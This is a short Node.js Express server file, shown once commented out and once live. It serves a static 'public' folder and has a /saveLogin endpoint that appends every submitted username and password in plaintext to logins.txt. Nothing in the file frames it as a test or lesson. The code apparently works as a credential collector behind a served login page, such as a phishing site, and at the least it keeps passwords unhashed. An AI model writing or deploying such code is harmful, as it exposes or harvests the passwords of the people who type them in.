// const express = require('express');
// const bodyParser = require('body-parser');
// const fs = require('fs');
// const path = require('path');

// const app = express();
// const PORT = process.env.PORT || 3000;

// app.use(bodyParser.json());
// app.use(express.static(path.join(__dirname, 'public')));

// app.post('/saveLogin', (req, res) => {
//     const { username, password } = req.body;

//     // Save credentials to logins.txt
//     const logins = `${username}:${password}\n`;
//     fs.appendFile('logins.txt', `Username: ${username}, Password: ${password}\n`, (err) => {
//         if (err) {
//             res.json({ success: false });
//         } else {
//             res.json({ success: true });
//         }
//     });
// });

// app.listen(PORT, () => {
//     console.log(`Server running on http://localhost:${PORT}`);
// });
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/saveLogin', (req, res) => {
    const { username, password } = req.body;
    fs.appendFile('logins.txt', `Username: ${username}, Password: ${password}\n`, (err) => {
        if (err) {
            res.json({ success: false });
        } else {
            res.json({ success: true });
        }
    });
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});
